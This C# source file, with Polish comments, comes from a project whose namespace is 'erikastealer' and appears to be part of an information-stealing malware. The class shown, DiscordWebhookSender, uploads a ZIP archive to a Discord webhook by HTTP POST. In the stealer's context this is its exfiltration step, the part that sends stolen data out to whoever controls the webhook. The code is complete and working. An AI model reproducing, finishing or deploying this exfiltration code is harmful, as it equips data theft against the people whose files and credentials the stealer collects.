namespace erikastealer
{
    using System;
    using System.IO;
    using System.Net.Http;
    using System.Net.Http.Headers;
    using System.Threading.Tasks;

    /// <summary>
    /// Implementacja interfejsu IFileSender do wysyłania plików przez webhook Discorda.
    /// </summary>
    public class DiscordWebhookSender : IFileSender
    {
        private readonly string _webhookUrl;
        private readonly HttpClient _httpClient;

        /// <summary>
        /// Konstruktor klasy, przyjmuje URL webhooka Discorda.
        /// </summary>
        /// <param name="webhookUrl">Adres webhooka Discorda.</param>
        public DiscordWebhookSender(string webhookUrl)
        {
            _webhookUrl = webhookUrl ?? throw new ArgumentNullException(nameof(webhookUrl));
            _httpClient = new HttpClient();
        }

        /// <summary>
        /// Wysyła plik ZIP na Discorda jako załącznik.
        /// </summary>
        /// <param name="filePath">Ścieżka do pliku.</param>
        public async Task SendFileAsync(string filePath)
        {
            if (!File.Exists(filePath))
                throw new FileNotFoundException("Plik nie istnieje", filePath);

            using (var form = new MultipartFormDataContent())
            using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                var fileContent = new StreamContent(fileStream);
                fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/zip");
                form.Add(fileContent, "file", Path.GetFileName(filePath));

                // Wysyłanie żądania HTTP POST do webhooka
                var response = await _httpClient.PostAsync(_webhookUrl, form);

                // Sprawdzanie odpowiedzi
                if (!response.IsSuccessStatusCode)
                {
                    string responseContent = await response.Content.ReadAsStringAsync();
                    throw new Exception($"Błąd podczas wysyłania: {response.StatusCode}\n{responseContent}");
                }
            }

            Console.WriteLine("Plik został pomyślnie wysłany.");
        }
    }
}
